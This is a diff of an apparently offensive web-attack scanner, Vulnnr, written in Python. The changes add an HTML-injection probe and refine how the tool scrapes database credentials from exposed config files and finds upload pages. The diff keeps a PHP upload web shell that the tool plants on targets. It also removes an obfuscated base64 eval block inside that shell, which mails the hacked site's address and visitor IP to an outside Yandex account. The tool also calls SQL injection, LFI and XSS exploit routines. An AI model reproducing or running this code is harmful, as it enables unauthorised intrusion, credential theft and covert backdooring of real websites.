@@ -34,8 +34,8 @@ now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
 site = "www.fedsearch.xyz"
-Version = "1.3"
-timeout = 8
+Version = "1.3.1"
+timeout = 5
 
 
 HEADERS = {
@@ -84,19 +84,28 @@ def proxyss():
     return proxy
 
 proxy = proxyss()
+
+
 def autoupdate():
-    print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Checking for updates...")
-    test = requests.get("https://github.com/X-x-X-0/Vulnnr/blob/main/checks.txt")
-    time.sleep(3)
-    if Version in test.text:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
-        time.sleep(3)
-        os.system('cls;clear')
-        banner()
+    with open('config.json') as json_file:
+        data = json.load(json_file)
+    if data['check-for-updates'] == "yes":
+
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Checking for updates...")
+        test = requests.get("https://github.com/X-x-X-0/Vulnnr/blob/main/checks.txt")
+        time.sleep(2)
+        if Version in test.text:
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
+            time.sleep(2)
+            os.system('cls;clear')
+            banner()
+        else:
+            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}looks like u are using Vulnnr v{Version}, sadly that is currently out of date please update repo!")
+            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {GREEN}https://github.com/X-x-X-0/Vulnnr.git")
+            sys.exit()
     else:
-        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}looks like u are using Vulnnr v{Version}, sadly that is currently out of date please update repo!")
-        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {GREEN}https://github.com/X-x-X-0/Vulnnr.git")
-        sys.exit()
+        banner()
+        pass
 autoupdate()
 
 dirs = [
@@ -256,6 +265,18 @@ def config(url, path):
         GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
         if GetConfig.status_code == 200:
+            if "404" in GetConfig.text:
+                pass
+            elif "not found" in GetConfig.text:
+                pass
+            elif "cloudflare" in GetConfig.text:
+                pass
+            elif " You are lost!" in GetConfig.text:
+                pass
+            elif "file not here" in GetConfig.text:
+                pass
+            elif "Please turn JavaScript on and reload the page" in GetConfig.text:
+                pass
             if "DB_NAME" in GetConfig.text:
 
                 with io.open(filename, "a+", encoding="utf-8") as f:
@@ -300,7 +321,24 @@ def config(url, path):
 
 
 
+def htmi(url):
+    inc = requests.get(f"{url}/search/top?query=<h1>fedsearch</h1>")
+    inc2 = requests.get(f"{url}/search/top?search=<h1>fedsearch</h1>")
+    if "404" in inc.text or "404" in inc2.text:
+        pass
+    elif "not found" in inc.text or "not found" in inc2.text:
+        pass
+    elif "cloudflare" in inc.text or "cloudflare" in inc2.text:
+         pass
+    elif " You are lost!" in inc.text or "You are lost!" in inc2.text:
+        pass
+    elif "file not here" in inc.text or "file not here" in inc2.text:
+        pass
 
+    elif "<h1>fedsearch</h1>" in inc.text or "<h1>fedsearch</h1>" in inc2.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}HTML Injection {PURPLE}=> {GREEN}{inc.url} ")
+    else:
+        pass
 
 
 def com_s5(url):
@@ -376,15 +414,30 @@ def dirsscan(url, path):
             if "Checking Browser" in GetConfig:
                 pass
             else:
-
-                if GetConfig.status_code == 200:
-                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
-                if "File Upload Manager" in GetConfig.text:
-                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Might be a file upload? ")
-                if "Backup-Management (phpMyBackup v.0.4 beta * )" in GetConfig.text:
-                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}phpMyBackup v.0.4 ")
-                if "Index of" in GetConfig.text:
-                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Open directory ")
+                if "404" in GetConfig.text:
+                    pass
+                elif "not found" in GetConfig.text:
+                    pass
+                elif "cloudflare" in GetConfig.text:
+                    pass
+                elif "CloudFront" in GetConfig.text:
+                    pass
+                elif " You are lost!" in GetConfig.text:
+                    pass
+                elif "file not here" in GetConfig.text:
+                    pass
+                elif "Please turn JavaScript on and reload the page" in GetConfig.text:
+                    pass
+                else:
+                    
+                    if GetConfig.status_code == 200:
+                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
+                    if "File Upload Manager" in GetConfig.text:
+                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Might be a file upload? ")
+                    if "Backup-Management (phpMyBackup v.0.4 beta * )" in GetConfig.text:
+                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}phpMyBackup v.0.4 ")
+                    if "Index of" in GetConfig.text:
+                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Open directory ")
                 
         
     except:
@@ -399,6 +452,17 @@ def dorkinfos(url, path):
     filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
     if GetConfig.status_code == 200:
         if "404" in GetConfig.text:
+            pass
+        
+        elif "not found" in GetConfig.text:
+            pass
+        elif "cloudflare" in GetConfig.text:
+                pass
+        elif " You are lost!" in GetConfig.text:
+                pass
+        elif "file not here" in GetConfig.text:
+                pass
+        elif "Please turn JavaScript on and reload the page" in GetConfig.text:
             pass
         elif "file not found" in GetConfig.text:
             pass
@@ -1173,7 +1237,7 @@ def Exploitt(site):
         
             
             
-        return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not find prams to test for SQL")
+        return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET} prams not found")
     except Exception as e:
         #print(e)
         return 
@@ -1220,10 +1284,7 @@ def rand_str(len=None):
     if len == None:
         len = 8
     return ''.join(rand('abcdefghijklmnopqrstuvwxyz', len))
-shell = """ <?php echo 'Vulnnr'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
-<?php
-eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
-?>"""
+shell = """ <?php echo 'Vulnnr'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
 def gf(url):
     
     filenames = 'hateme' + '__' + rand_str(5) + '.php'
@@ -1528,7 +1589,7 @@ def auto(url):
             wp_plugin(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             
-
+            
             dirs2(url)
             dorkinfo(url)
             wp_dirs(url)
@@ -1540,6 +1601,7 @@ def auto(url):
             fileup(url)
             LFI(site)
             simple(url)
+            htmi(url)
             #wp_thumbnailSlider(url) Broken
             revslidercss(url)
             eCommerce(url)
@@ -1591,10 +1653,11 @@ def auto(url):
             
             dirs2(url)
             dorkinfo(url)
-            #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
+            print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
             LFI(site)
             asistorage(url)
+            htmi(url)
             gf(url)
             Exploitt(site)
             Triconsole(url)
@@ -1604,6 +1667,8 @@ def auto(url):
             xss(site)
 
         if "API count exceeded - Increase Quota with Membership" in host:
+            pass
+        elif "error check your search parameter" in host:
             pass
         else:
             print(f"\n{PURPLE} [ {GREEN}~ {RESET} Domain scan {GREEN}~{RESET} {PURPLE}]{RESET}")
@@ -2023,7 +2088,7 @@ def main():
         wp_plugin(url)
         return main()
     elif userinput == "shellcheck":
-        os.system("python3 shellchecker.py")
+        os.system("python shellchecker.py")
     elif userinput == "dirscan":
         dirscan()
     elif userinput == "wpthemes":
